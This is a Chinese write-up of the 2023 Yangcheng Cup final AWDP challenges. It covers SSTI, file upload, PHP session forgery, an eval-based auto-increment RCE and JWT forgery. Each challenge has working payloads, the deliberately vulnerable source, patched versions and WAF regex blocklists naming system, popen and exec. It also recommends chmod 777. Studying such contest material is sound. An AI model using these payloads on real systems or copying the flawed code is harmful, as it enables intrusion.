要根据服务启动的用户去启动，例如weblogic不能root启动，不能盲目使用sudo命令，以及就是权限问题，最好直接给777权限

```
sudo chmod -R 777 /app/*
1
```

## 七、AWDP实践

## \[羊城杯-2023-决赛\] ezSSTI (Break)

Break+Fix，其实就是CTF+Fix，Fix规则有点难崩。Break和Fix题目是一样的。

![image-20230912103455972](https://img-blog.csdnimg.cn/img_convert/afd56e93f8db6e1bf0c8b3e571ba806c.png)

看到是SSTI，焚靖直接一把梭了。

```
python -m fenjing crack --method GET --inputs name --url 'http://10.1.110.2:20000/'
1
```

瞎了，执行 `ls /` 时候flag文件在命令旁边没看见，find命令找了好久呜呜呜。

痛失一血，只有二血。。。。

![image-20230909094111626](https://img-blog.csdnimg.cn/img_convert/ab09cc272f24361991eac5b20134c4f1.png)

![202309111635737](https://img-blog.csdnimg.cn/img_convert/09a54553430f3c52b1122053fdfc8dbf.png)

![202309111635738](https://img-blog.csdnimg.cn/img_convert/c240ca0c33bbad7ce2b8b7c7a08c8970.png)

源码如下：

```python
from flask import Flask,request
from jinja2 import Template
import re

app = Flask(__name__)

@app.route("/")
def index():
    name = request.args.get('name','CTFer<!--?name=CTFer')
    if not re.findall(r"'|_|\\x|\\u|{{|\+|attr|\.| |class|init|globals|popen|system|env|exec|shell_exec|flag|passthru|proc_popen",name):
        t = Template("hello "+name)
        return t.render()
    else:
        t = Template("Hacker!!!")
        return t.render()

if __name__ == "__main__":
    app.run(host="0.0.0.0",port=5000)
python123456789101112131415161718
```

## \[羊城杯-2023-决赛\] ezSSTI (Fix)

初始源码：

```php
from flask import Flask,request
from jinja2 import Template
import re

app = Flask(__name__)

@app.route("/")
def index():
    name = request.args.get('name','CTFer<!--?name=CTFer')
    if not re.findall(r"'|_|\\x|\\u|{{|\+|attr|\.| |class|init|globals|popen|system|env|exec|shell_exec|flag|passthru|proc_popen",name):
        t = Template("hello "+name)
        return t.render()
    else:
        t = Template("Hacker!!!")
        return t.render()

if __name__ == "__main__":
    app.run(host="0.0.0.0",port=5000)
php123456789101112131415161718
```

修后源码，正则过滤部分多加了。

**但是没过** ，很奇怪为什么过滤了单个花括号 `{` 及其URL编码都不行，当时check后 也不回显是waf多了还是少了。迷。

```python
from flask import Flask,request
from jinja2 import Template
import re

app = Flask(__name__)

@app.route("/")
def index():
    name = request.args.get('name','CTFer<!--?name=CTFer')
    if not re.findall(r"'|_|\\x|\\u|{{|\+|attr|\.| |class|init|globals|popen|system|env|exec|shell_exec|flag|passthru|proc_popen|{|set|\[|\(|%7b|eval|1|2|3|4|5|6|7|8|9",name):
        t = Template("hello "+name)
        return t.render()
    else:
        t = Template("Hacker!!!")
        return t.render()

if __name__ == "__main__":
    app.run(host="0.0.0.0",port=5000)
python123456789101112131415161718
```

贴一个 `Enterpr1se` 师傅的waf：

还需要过滤引号、斜杠等符号。

![image-20230912133714384](https://img-blog.csdnimg.cn/img_convert/c995081c2946ffea31dea6c4b650c06d.png)

## \[羊城杯-2023-决赛\] easyupload (Break)

题目描述：小明同学学会了用apache搭建网站，你能帮助他找到存在的安全问题么？

开题是一个非常猛男的网页，需要登录。

![image-20230909124248353](https://img-blog.csdnimg.cn/img_convert/8291d7a17c7e19e0413f7a7887300714.png)

本来想爆破的，看了一下源码，发现账号密码就在源码里面。

![image-20230909124330158](https://img-blog.csdnimg.cn/img_convert/2b06e052a1ac71dd1a1aa477a5c8548c.png)

登录后是一个文件上传的界面。

题目提到了 `Apache` ，那么我们首先想到的就是 `Apache` 解析漏洞啦。

![image-20230912093659357](https://img-blog.csdnimg.cn/img_convert/447d977450d3350ed7a4659a2160fec7.png)

上传文件名为 `shell.php.txt` ，检查时候php拿到的是`.txt` 后缀，解析时候Apache把文件当成是`.php` 后缀。

![image-20230909124739700](https://img-blog.csdnimg.cn/img_convert/76265ed3b5982ee7b687ca8f2be67fc9.png)

访问上传文件的链接在源码里面。

![image-20230909124711705](https://img-blog.csdnimg.cn/img_convert/4753bd2555af28d7cdae65d7b758b106.png)

payload：

```
1=system('tac /flag.txt');
1
```

![image-20230909124622289](https://img-blog.csdnimg.cn/img_convert/b30ee505d7e8c5e17d14acf395ef81fa.png)

## \[羊城杯-2023-决赛\] easyupload (Fix)

初始源码：（ `dadaadwdwfegrgewg.php` ）

```php
<?php
header("Content-type: text/html;charset=utf-8");
error_reporting(1);

define("WWW_ROOT",$_SERVER['DOCUMENT_ROOT']);
define("APP_ROOT",str_replace('\\','/',dirname(__FILE__)));
define("APP_URL_ROOT",str_replace(WWW_ROOT,"",APP_ROOT));
define("UPLOAD_PATH", "upload");
?>
<?php

$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传!';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
?>

<div id="upload_panel">
            <form enctype="multipart/form-data" method="post" onsubmit="return checkFile()">
                <p>请选择要上传的图片：<p>
                <input class="input_file" type="file" name="upload_file"/>
                <input class="button" type="submit" name="submit" value="上传"/>
            </form>
            <div id="msg">
                <?php 
                    if($msg != null){
                        echo "提示：".$msg;
                    }
                ?>
            </div>
            <div id="img">
                <?php
                    if($is_upload){
                        echo '<img src="'.$img_path.'" width="250px" />';
                    }
                ?>
            </div>
</div>
php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263
```

修后源码：（黑名单变成白名单+只允许出现一个点号）前者防止`.htaccess` 配置文件，后者防Apache解析漏洞。

```php
<?php
header("Content-type: text/html;charset=utf-8");
error_reporting(1);

define("WWW_ROOT",$_SERVER['DOCUMENT_ROOT']);
define("APP_ROOT",str_replace('\\','/',dirname(__FILE__)));
define("APP_URL_ROOT",str_replace(WWW_ROOT,"",APP_ROOT));
define("UPLOAD_PATH", "upload");
?>
<?php

$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".jpg",".png",".jpeg");         //【修改点一】
        $file_name = trim($_FILES['upload_file']['name']);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if (in_array($file_ext, $deny_ext)&&substr_count($_FILES['upload_file']['name'], '.')===1) {//【修改点二】
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传!';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
?>

<div id="upload_panel">
    <form enctype="multipart/form-data" method="post" onsubmit="return checkFile()">
        <p>请选择要上传的图片：<p>
            <input class="input_file" type="file" name="upload_file"/>
            <input class="button" type="submit" name="submit" value="上传"/>
    </form>
    <div id="msg">
        <?php
        if($msg != null){
            echo "提示：".$msg;
        }
        ?>
    </div>
    <div id="img">
        <?php
        if($is_upload){
            echo '<img src="'.$img_path.'" width="250px" />';
        }
        ?>
    </div>
</div>
php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263
```

赛后和师傅们讨论了发现，除了我那种Apache解析漏洞的做法，还能通过`.htaccess` 配置文件修改配置项解析 `png` 等格式的图片。属于是一题多解了，两个都不是非预期，都会check。

## \[羊城杯-2023-决赛\] BabyMemo (Break)

这题的话知识点就是php的session。主要考察的是代码逻辑漏洞，题目源码中本来用于过滤非法字符串`../` 的功能经过一系列操作之后可以用于伪造session文件。

注，自己部署的话记得在 `index.php` 中加一句 `session_start();`

memo翻译过来是备忘录。

![image-20230909121606062](https://img-blog.csdnimg.cn/img_convert/129727e71396ea3dd81c8f0161c3964b.png)

**源码见fix。**

主要是 `memo.php` 中的这两段代码。

1、给我们定义任意后缀的权力，但是过滤了`../` 。

![image-20230914132247862](https://img-blog.csdnimg.cn/img_convert/52be184e7d49b75adfdf03bf30d0f4fd.png)

然后把文件写入 `/tmp` 目录（也是存放session文件的目录），文件名是 `用户名_随机数.后缀` 。下图是比赛时的一张截图。

![image-20230909132221775](https://img-blog.csdnimg.cn/img_convert/fae05210019db2b0f0ac7d9bd235fa60.png)

这里先放一部分思路，就是我们自定义后缀名为`./` 时候，文件名是 `用户名_随机数../` ，经过过滤替换后变成 `用户名_随机数` 。

php的session是存放在文件中的 默认位置是 `/tmp/sess_PHPSESSID` 。如果用户名是sess，PHPSESSID设置成随机数，那么文件名就是 `sess_PHPSESSID` 。我们写入的文件就代替了原先的session文件成为程序现在的session文件。

2、如果 `$_SESSION['admin'] === true` ，那就给我们flag。

![image-20230914132217695](https://img-blog.csdnimg.cn/img_convert/86cca8fc41c9f3f877c6d5f1f03ff119.png)

---

总结一下思路就是伪造session文件使 `$_SESSION['admin'] === true`

当时题目用的session处理器就是默认的 `php处理器` 。session文件的内容和下图相似：

![image-20230914133124180](https://img-blog.csdnimg.cn/img_convert/57acc51c3590fbcee2dc9ccfcb605920.png)

我们伪造的文件内容应该是 `admin|b:1;username|s:4:"sess";memos|a:2:{i:0;s:3:"aaa";i:1;s:3:"aaa";}`

因为自定义后缀的话，写入文件的内容是经过一次rot13编码的，所以我们写入的应该是rot13解码后的内容 `nqzva|o:1;hfreanzr|f:4:"frff";zrzbf|n:2:{v:0;f:3:"nnn";v:1;f:3:"nnn";}`

![image-20230914133701122](https://img-blog.csdnimg.cn/img_convert/cff93c29c4cedd24f596fae72d1f06c8.png)

![image-20230914135039197](https://img-blog.csdnimg.cn/img_convert/58cc260b43c24269d5cc9cc45f6cc9b4.png)

点击下载，抓包。然后我们自定义后缀，写入、下载文件。

```
用户名：sess
POST:compression=./&backup=1
12
```

文件被写入到了 `/tmp/sess_41983787c3a288d9`

![image-20230914135304898](https://img-blog.csdnimg.cn/img_convert/4e94818b933bfb9295cdb606be8f5995.png)

![image-20230914135407768](https://img-blog.csdnimg.cn/img_convert/42bc457f65776b349436b8a1b365d66b.png)

此时随机数是 `41983787c3a288d9` ，如果我们把它设置成 `PHPSESSID` ，那就导致刚刚我们写入的文件变成了session文件了，文件内容 `admin|b:1` 导致我们可以满足 `$_SESSION['admin'] === true` ，直接获得了flag。

![image-20230914135621192](https://img-blog.csdnimg.cn/img_convert/4e508e96f61101329bd44526382c5c56.png)

## \[羊城杯-2023-决赛\] BabyMemo (Fix)

初始源码：

（index.php）

```php
<?php
ob_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['username']) && !empty($_POST['username'])) {
        $_SESSION['username'] = $_POST['username'];

        if (!isset($_SESSION['memos'])) {
            $_SESSION['memos'] = [];
        }

        echo '<script>window.location.href="memo.php";</script>';
        exit;
    } else {
        echo '<script>window.location.href="index.php?error=1";</script>';
        exit;
    }
}
ob_end_flush();
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple Memo Website</title>
    <style>
        body {
            background-color: beige;
            font-family: Arial, sans-serif;
        }

        h1 {
            color: darkslategray;
        }

        form {
            margin: 30px auto;
            width: 80%;
            padding: 20px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0px 0px 10px 2px rgba(0, 0, 0, 0.3);
        }

        label {
            display: block;
            margin-bottom: 10px;
        }

        input[type="text"] {
            width: 100%;
            padding: 10px;
            border-radius: 5px;
            border: none;
            margin-bottom: 20px;
        }

        button[type="submit"] {
            background-color: darkslategray;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
        }

        button[type="submit"]:hover {
            background-color: steelblue;
        }
    </style>
</head>

<body>
    <h1>Login</h1>
    <form action="index.php" method="post">
        <label for="username">Username:</label>
        <input type="text" name="username" id="username" required>
        <button type="submit">Login</button>
    </form>
</body>

</html>
php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384
```

memo.php

```php
<?php
session_start();

if (!isset($_SESSION['username'])) {
    header('Location: index.php');
    exit();
}

if (isset($_POST['memo']) && !empty($_POST['memo'])) {
    $_SESSION['memos'][] = $_POST['memo'];
}

if (isset($_POST['backup'])) {
    $backupMemos = implode(PHP_EOL, $_SESSION['memos']);

    $random = bin2hex(random_bytes(8));
    $filename = '/tmp/' . $_SESSION['username'] . '_' . $random;

    // Handle compression method and file extension
    $compressionMethod = $_POST['compression'] ?? 'none';
    switch ($compressionMethod) {
        case 'gzip':
            $compressedData = gzencode($backupMemos);
            $filename .= '.gz';
            $mimeType = 'application/gzip';
            break;
        case 'bzip2':
            $compressedData = bzcompress($backupMemos);
            $filename .= '.bz2';
            $mimeType = 'application/x-bzip2';
            break;
        case 'zip':
            $zip = new ZipArchive();
            $zipFilename = $filename . '.zip';
            if ($zip->open($zipFilename, ZipArchive::CREATE) === true) {
                $zip->addFromString($filename, $backupMemos);
                $zip->close();
            }
            $filename = $zipFilename;
            $mimeType = 'application/zip';
            break;
        case 'none':
            $compressedData = $backupMemos;
            $filename .= '.txt';
            $mimeType = 'text/plain';
            break;
        default:
            // I don't know what extension this is, but I'll still give you the file. Don't play any tricks, okay~
            $compressedData = str_rot13($backupMemos);
            $filename .= '.' . $compressionMethod;
            $mimeType = 'text/plain';
            while (strpos($filename, '../') !== false) {
                $filename = str_replace('../', '', $filename);
            }
            break;
    }

    file_put_contents($filename, $compressedData);
    // Send headers and output file content
    header('Content-Description: File Transfer');
    header('Content-Type: ' . $mimeType);
    header('Content-Disposition: attachment; filename="' . basename($filename) . '"');
    header('Content-Length: ' . filesize($filename));
    readfile($filename);
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memo</title>
    <style>
        body {
            background-color: beige;
            font-family: Arial, sans-serif;
        }

        h1,
        h2 {
            color: darkslategray;
            margin-top: 30px;
            margin-bottom: 10px;
        }

        form {
            margin: 30px auto;
            width: 80%;
            padding: 20px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0px 0px 10px 2px rgba(0, 0, 0, 0.3);
        }

        label {
            display: block;
            margin-bottom: 10px;
        }

        input[type="text"],
        select {
            width: 100%;
            padding: 10px;
            border-radius: 5px;
            border: none;
            margin-bottom: 20px;
        }

        button[type="submit"] {
            background-color: darkslategray;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>

<body>
    <h1>Welcome, <?php echo htmlspecialchars($_SESSION['username']); ?></h1>
    <form action="memo.php" method="post">
        <label for="memo">New Memo:</label>
        <input type="text" name="memo" id="memo" required>
        <button type="submit">Add Memo</button>
    </form>
    <h2>Here 1s Your Memos:</h2>
    <ul>
        <?php foreach ($_SESSION['memos'] as $memo) : ?>
            <li><?php echo htmlspecialchars($memo); ?></li>
        <?php endforeach; ?>
        <?php if (isset($_SESSION['admin']) && $_SESSION['admin'] === true) : ?>
            <li><?php system("cat /flag"); ?></li> <!-- Only admin can get flag -->
        <?php endif ?>
    </ul>
    <form action="memo.php" method="post">
        <label for="compression">Compression method:</label>
        <select name="compression" id="compression">
            <option value="none">None</option>
            <option value="gzip">GZIP</option>
            <option value="bzip2">BZIP2</option>
            <option value="zip">ZIP</option>
        </select>
        <button type="submit" name="backup" value="1">Export Backup</button>
    </form>
</body>

</html>
php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149
```

未知攻焉知防。会打的话其实过滤很简单，对用户名加一个限制使其不等于 `sess` 就行了。

index.php加个waf就行了。

```php
<?php
ob_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['username']) && !empty($_POST['username'])) {
        
        
        
        
        
        
        
        if($_POST['username']!="sess"){
            $_SESSION['username'] = $_POST['username'];
        }
        
        
        
        
        
        
        
        if (!isset($_SESSION['memos'])) {
            $_SESSION['memos'] = [];
        }

        echo '<script>window.location.href="memo.php";</script>';
        exit;
    } else {
        echo '<script>window.location.href="index.php?error=1";</script>';
        exit;
    }
}
ob_end_flush();
?>
php1234567891011121314151617181920212223242526272829303132333435
```

## \[羊城杯-2023-决赛\] fuzee\_rce (Break)

爆破得出账号 `admin` ，密码 `admin123`

![image-20230909120204890](https://img-blog.csdnimg.cn/img_convert/35e1129f0fb5f1cea35a4b65e5590430.png)

登录后自动跳转到 `/goods.php` 路由，看不见源码，啥都看不见。

扫了一下后台还存在一个 `check.php` 文件，应该是用来限制 RCE 过滤的。

![image-20230909115538531](https://img-blog.csdnimg.cn/img_convert/e8df50c668ca018d5d6390cdbfbd73ed.png)

看不见源码的话，猜测这里是和 `[羊城杯 2020]easyser` 那题一样，需要自己找到传参名字然后题目才会返回更多的信息。Fix阶段看了一下源码，确实如此，需要 GET 传参对应参数后才会高亮源码。

一开始拿 `arjun` 工具扫了一下没有发现参数。其实应该直接拿burp爆破的。

```
arjun -u http://10.1.110.2:20003/goods.php
1
```

接下来是部署在本地的复现。

首先是在 `/goods.php` 路由暴力爆破参数。得到参数是 `w1key` 。（爆破量有点大，burp太慢的话可以拿python脚本爆）

题目中GET提交 `w1key` 参数得到源码。

![image-20230912095505338](https://img-blog.csdnimg.cn/img_convert/21fc71ec6c828db629d3c5431f504473.png)

```php
<?php
error_reporting(0);
include ("check.php");
if (isset($_GET['w1key'])) {
    highlight_file(__FILE__);
    $w1key = $_GET['w1key'];
    if (is_numeric($w1key) && intval($w1key) == $w1key && strlen($w1key) <= 3 && $w1key > 999999999) {
        echo "good";
    } 
    else {
        die("Please input a valid number!");
    }
}
if (isset($_POST['w1key'])) {
    $w1key = $_POST['w1key'];
    strCheck($w1key);
    eval($w1key);
}
?> 
php12345678910111213141516171819
```

---

首先是第一个if，GET提交的 `w1key` 要满足 `is_numeric($w1key) && intval($w1key) == $w1key && strlen($w1key) <= 3 && $w1key > 999999999` 。

聚焦到最后两个条件，首先想到的就是科学计数法。payload：`?w1key=1e9` 。

但是奇怪的是，这个payload本地可以过，题目过不了，嘶。

![image-20230912135031590](https://img-blog.csdnimg.cn/img_convert/7aef73440f7e54d88412568895dc5447.png)

![image-20230912135044007](https://img-blog.csdnimg.cn/img_convert/fdce755897ca8209165995b06a8f7caf.png)

修改一下vps上的源码看看是哪个条件没过。

发现是 `intval($w1key) == $w1key` 条件不满足。

![image-20230912143238596](https://img-blog.csdnimg.cn/img_convert/995896a48a3ae34bc7c536b93f7e67cb.png)

这个判断如果改成 `intval(1e9) == '1e9'` 就返回 `true` 。

研究了一下，是php版本问题。把我部署题目的vps上的php版本改成7就可以了，当然，我本地就是php7。

![image-20230912144218442](https://img-blog.csdnimg.cn/img_convert/412c3481fde5e31e94dbd0d60dbc3cb6.png)

payload：

```
?w1key=1e9
1
```

原理：

```
is_numeric($w1key)         //is_numeric函数可识别科学计数法
intval($w1key) == $w1key   //intval('1e9') === 1，$w1key === '1e9' =='1'
strlen($w1key) <= 3        //1e9 长度是3
$w1key > 999999999         //1e9 值是1000000000，多1
1234
```

---

然后是第二个if，burp跑一下单个字符的 `fuzz` 看看哪些能用。可以用的字符是：、`.`、`;`、 `'` 、 `/` 、 `[]` 、 `=` 、 `$` 、 `()` 、 `+` 、 `/` 、 `_`

![image-20230912145131469](https://img-blog.csdnimg.cn/img_convert/60496cd2b738fe323e7fa6b3c1d8dd89.png)

一看就是自增RCE，payload库里面挑一个合适的。

```
$%ff=_(%ff/%ff)[%ff];%2b%2b$%ff;$_=$%ff.$%ff%2b%2b;$%ff%2b%2b;$%ff%2b%2b;$_=_.$_.%2b%2b$%ff.%2b%2b$%ff;$$_[%ff]($$_[_]);
//传参是  %ff=system&_=cat /f1agaaa
12
```

payload：

```
GET：?w1key=1e9

POST：w1key=$%ff=_(%ff/%ff)[%ff];%2b%2b$%ff;$_=$%ff.$%ff%2b%2b;$%ff%2b%2b;$%ff%2b%2b;$_=_.$_.%2b%2b$%ff.%2b%2b$%ff;$$_[%ff]($$_[_]);&%ff=system&_=tac /flag
123
```

![image-20230912153835053](https://img-blog.csdnimg.cn/img_convert/37a0af525c6b4eb13cd8e5e56208346a.png)

waf源码如下。

![image-20230912094655747](https://img-blog.csdnimg.cn/img_convert/33c036f2b94a0abff6a74021dc2a2061.png)

## \[羊城杯-2023-决赛\] fuzee\_rce (Fix)

初始源码：

`goods.php` 文件

```php
<?php
error_reporting(0);
include ("check.php");
if (isset($_GET['w1key'])) {
    highlight_file(__FILE__);
    $w1key = $_GET['w1key'];
    if (is_numeric($w1key) && intval($w1key) == $w1key && strlen($w1key) <= 3 && $w1key > 999999999) {
        echo "good";
    } 
    else {
        die("Please input a valid number!");
    }
}
if (isset($_POST['w1key'])) {
    $w1key = $_POST['w1key'];
    strCheck($w1key);
    eval($w1key);
}
?>

php1234567891011121314151617181920
```

`check.php` 文件

```php
<?php
function strCheck($w1key)
{
    
    if (is_string($w1key) && strlen($w1key) <= 83) {
        if (!preg_match("/[1-9a-zA-Z!,@#^&%*:{}\-<\?>\"|\`~\\\\]/",$w1key)){
            return $w1key;
        }else{
            die("黑客是吧，我看你怎么黑！");  
        }
    }
    else{
        die("太长了");      
      }
    }   

php12345678910111213141516
```

`check.php` 文件多加点过滤就能fix。（百分号 `%` （%）一定要加）

```php
<?php
function strCheck($w1key)
{

    if (is_string($w1key) && strlen($w1key) <= 83) {
        if (!preg_match("/[1-9a-zA-Z!,@#^&%*:{}\-<\?>\"|\`~\\\\_$()+=;\%]/",$w1key)){
            return $w1key;
        }else{
            die("黑客是吧，我看你怎么黑！");
        }
    }
    else{
        die("太长了");
    }
}
php123456789101112131415
```

## \[羊城杯-2023-决赛\] Oh! My PDF (Break)

python语言的，部署本地倒是废了一些功夫。记录一下。

首先把源码包cv到vps上面。

![image-20230915165731964](https://img-blog.csdnimg.cn/img_convert/f808b130c3977fd74206c3c8ade5dc08.png)

然后把需要的库全安装好。

cd到源码放的目录下，运行 `nohup python3 -u app.py > out.log 2>&1 &` 。

如果报错 `OSError: cannot load library 'pango-1.0-0': pango-1.0-0: cannot open shared object file: No such file or directory. Additionally, ctypes.util.find_library() did not manage to locate a library called 'pango-1.0-0'` 那就先运行命令 `apt-get install -y libpangocairo-1.0-0` 。其他的报错基本上是库没有。

成功运行 `nohup python3 -u app.py > out.log 2>&1 &` 后，同目录下会生成两个文件：  
![image-20230915170014474](https://img-blog.csdnimg.cn/img_convert/3b62fdb148ce59bd163ab128537879ad.png)

检查 `out.log` 。发现题目源码是运行在了 `8080` 端口。

![image-20230915170057248](https://img-blog.csdnimg.cn/img_convert/0b033b262a2b9ba00bf42a59ec42ef11.png)

访问 `vps-ip:8080` ，发现题目源码运行成功！

![image-20230915170130418](https://img-blog.csdnimg.cn/img_convert/341f90304059aa9a9cd824d5e78a787c.png)

坑点就是 `import jwt` ，但是安装的包是 `PyJWT`

重启服务 `ps -ef | grep python | grep -v grep | awk '{print $2}' | xargs kill -9 `

参考文章：

> [如何优雅的部署Python应用到Linux服务器？\_python能否直接向linux储存文件\_緈諨の約錠的博客-CSDN博客](https://blog.csdn.net/smilehappiness/article/details/117337943)
> 
> [Python代码部署到Linux（亲测成功）\_python程序部署到linux\_繁星、晚风的博客-CSDN博客](https://blog.csdn.net/qq_39530754/article/details/112833233)
> 
> [大码王的博客 (cnblogs.com)](https://www.cnblogs.com/huanghanyu/p/12921842.html)
> 
> [手把手教你如何从零开始部署一个Python项目到服务器 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/595872062)

---

开始做题。源码如下：

```python
from flask import Flask, request, jsonify, make_response, render_template, flash, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
import jwt
import re
from urllib.parse import urlsplit
from flask_weasyprint import HTML, render_pdf
from werkzeug.security import generate_password_hash, check_password_hash
import os

app = Flask(__name__)

# 设置应用的秘密密钥和数据库URI
app.config['SECRET_KEY'] = os.urandom(10)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'

# 初始化数据库
db = SQLAlchemy(app)

# 正则表达式用于检查URL的有效性
URL_REGEX = re.compile(
    r'http(s)?://'  # http或https
    r'(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+'
)

# 用户模型
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(80), nullable=False)
    is_admin = db.Column(db.Boolean, nullable=False, default=False)

# 创建数据库
def create_database(app):
    with app.app_context():
        db.create_all()

# 检查URL的有效性
def is_valid_url(url):
    if not URL_REGEX.match(url):
        return False
    return True

# 用户注册
@app.route('/register', methods=['POST','GET'])
def register():
    if request.method == 'POST':
        try:
            data = request.form
            hashed_password = generate_password_hash(data['password'])
            new_user = User(username=data['username'], password=hashed_password, is_admin=False)
            db.session.add(new_user)
            db.session.commit()
            return render_template('register.html', message='User registered successfully')
        except:
            return render_template('register.html', message='Register Error!'), 500
    else:
        return render_template('register.html', message='please register first!')

# 用户登录
@app.route('/login', methods=['POST', 'GET'])
def login():
    # 处理针对 '/login' 路径的 HTTP GET 和 POST 请求
    if request.method == 'POST':
        # 如果是 POST 请求，表示用户正在尝试登录
        data = request.form  # 获取从用户提交的表单中获取的数据

        # 通过用户名从数据库中查找用户记录
        user = User.query.filter_by(username=data['username']).first()

        # 检查用户是否存在且密码是否匹配
        if user and check_password_hash(user.password, data['password']):
            # 如果用户存在且密码匹配

            # 生成访问令牌（JWT），包括用户名和是否为管理员的信息
            access_token = jwt.encode(
                {'username': user.username, 'isadmin': False},
                app.config['SECRET_KEY'],  # 使用配置的密钥进行签名
                algorithm="HS256"  # 使用 HS256 算法进行签名
            )

            # 创建一个 Flask 响应对象，重定向到名为 'ohmypdf' 的路由
            res = make_response(redirect(url_for('ohmypdf')))

            # 在响应中设置 Cookie，将访问令牌存储在客户端
            res.set_cookie('access_token', access_token)

            # 返回响应和状态码 200（表示成功）
            return res, 200
        else:
            # 如果用户不存在或密码不匹配，返回带有错误消息的登录页面和状态码 500（服务器内部错误）
            return render_template('login.html', message='Invalid username or password'), 500
    else:
        # 如果是 HTTP GET 请求，返回登录页面
        return render_template('login.html'), 200

# 主页,关键看这里
@app.route('/', methods=['GET', 'POST'])
def ohmypdf():
    # 从请求中获取访问令牌（如果存在）
    access_token = request.cookies.get('access_token')
    if not access_token:
        # 如果没有访问令牌，将用户重定向到登录页面
        return redirect(url_for("login"))

    try:
        # 尝试解码访问令牌，使用应用程序的秘密密钥和HS256算法
        decoded_token = jwt.decode(
            access_token, app.config['SECRET_KEY'], algorithms=["HS256"], options={"verify_signature": False})
        isadmin = decoded_token['isadmin']
    except:
        # 如果解码失败，返回登录页面并显示“Invalid access token”消息
        return render_template('login.html', message='Invalid access token')

    if not isadmin:
        # 如果用户不具有管理员权限，返回错误页面，HTTP状态码为403 Forbidden
        return render_template('index.html', message='You do not have permission to access this resource. Where is the admin?!'), 403

    if request.method == 'POST':
        # 如果收到【POST】请求的参数【url】
        url = request.form.get('url')
        if is_valid_url(url):
            try:
                # 创建HTML对象，从给定的URL获取内容
                html = HTML(url=url)
                # 生成PDF文件，名字是output.pdf
                pdf = html.write_pdf()
                response = make_response(pdf)
                response.headers['Content-Type'] = 'application/pdf'
                response.headers['Content-Disposition'] = 'attachment; filename=output.pdf'
                return response
            except Exception as e:
                # 如果生成PDF出错，返回错误消息，HTTP状态码为500 Internal Server Error
                return f'Error generating PDF', 500
        else:
            # 如果URL无效，返回错误消息
            return f'Invalid URL!'
    else:
        # 如果是GET请求，渲染名为“index.html”的模板并返回
        return render_template("index.html"), 200

if __name__ == '__main__':
    create_database(app)
    app.run(host='0.0.0.0', port=8080)

python123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148
```

**先简要说明一下全题思路。**

**注册登录用户后，伪造JWT使自己成为admin。然后利用Python中WeasyPrint库的漏洞读取任意文件。**

---

首先伪造JWT，这里密钥由 `os.urandom(10)` 生成，无法预测。

但是看源码如何解密JWT的，没有验证密钥。所以这里的JWT可以用空密钥来伪造。

```python
# 尝试解码访问令牌，使用应用程序的秘密密钥和HS256算法                                                                         
decoded_token = jwt.decode(access_token, app.config['SECRET_KEY'], algorithms=["HS256"], options={"verify_signature": False})

isadmin = decoded_token['isadmin']      
python1234
```

